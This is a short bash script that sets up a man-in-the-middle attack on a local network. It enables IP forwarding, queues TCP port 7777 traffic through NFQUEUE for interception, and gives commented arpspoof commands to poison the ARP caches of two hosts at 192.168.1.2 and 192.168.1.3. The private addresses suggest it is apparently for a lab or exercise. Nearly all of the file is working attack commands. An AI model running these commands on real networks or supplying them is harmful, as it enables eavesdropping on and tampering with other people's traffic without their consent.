#! /bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward

iptables -A FORWARD -p tcp --dport 7777 -j NFQUEUE --queue-num 0

# Please run each of the command below on two seperate terminal. Basically the commands below is to perform arp spoofing. 
# If you have a script that can do the same, you can safely ignore the commands below.

# arpspoof -i eth0 -t 192.168.1.2 192.168.1.3
# arpspoof -i eth0 -t 192.168.1.3 192.168.1.2










